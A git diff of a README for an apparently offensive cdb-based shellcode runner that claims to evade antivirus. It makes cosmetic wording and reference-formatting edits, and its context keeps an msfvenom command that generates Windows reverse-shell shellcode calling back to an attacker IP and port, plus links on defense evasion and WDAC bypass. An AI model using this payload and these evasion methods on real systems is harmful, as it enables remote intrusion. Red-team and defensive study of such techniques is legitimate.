@@ -42,7 +42,7 @@ It's that easy! It's also great at evading AV detection due to its unusual forma
 
 ## Example
 
-First Generate shellcode using msfvenom.
+First generate shellcode using msfvenom.
 
     msfvenom -p window/x64/shell_reverse_tcp LHOST=10.0.0.197 LPORT=4444 -f python
 
@@ -134,11 +134,9 @@ How can cdb help? If you can get cdb to attach to a process then you can cause i
 
 # References
 
-http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
-
-https://github.com/galoryber/MITRE/blob/master/Defense_Evasion/T1127-CDB.py
-
-https://fortynorthsecurity.com/blog/how-to-bypass-wdac-with-dbgsrv-exe/
+* http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
+* https://github.com/galoryber/MITRE/blob/master/Defense_Evasion/
+* https://fortynorthsecurity.com/blog/how-to-bypass-wdac-with-dbgsrv-exe/
 
 # Acknowledgement
 
